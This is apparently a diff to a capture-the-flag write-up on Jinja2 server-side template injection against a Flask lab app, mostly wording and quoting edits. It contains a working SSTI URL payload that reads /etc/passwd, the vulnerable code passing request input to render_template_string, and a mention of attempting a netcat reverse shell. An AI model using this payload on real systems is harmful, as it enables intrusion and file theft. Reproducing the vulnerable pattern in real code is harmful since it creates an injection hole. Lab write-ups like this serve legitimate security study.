@@ -245,9 +245,9 @@ ict_items([('ENV', 'production'), ('DEBUG', False),
  
  Jinja2 is used by Python Web Frameworks such as Django or Flask  
  
- You can different payload at : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2  
+ You can use differents payload at : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2  
  
- I started by trying to read files  
+ I started to read files  
  
  http://192.168.1.106/?search={{%20get_flashed_messages.__globals__.__builtins__.open(%22/etc/passwd%22).read()%20}}
  
@@ -333,14 +333,14 @@ import os
 
 app = Flask(__name__)
 
-@app.route(&#39;/&#39;)
+@app.route("/")
 def index():
-        if request.args.get(&#39;search&#39;):
-            return render_template_string(request.args.get(&#39;search&#39;))
+        if request.args.get("search"):
+            return render_template_string(request.args.get("search"))
 
         else:
-            return render_template(&#39;index.html&#39;)
-if __name__ == &#39;__main__&#39;:
+            return render_template("index.html")
+if __name__ == "__main__":
     app.run()
 ```
 I tried to get reverse shell using netcat, i got the connection but if i use -e sh or bash it's not working
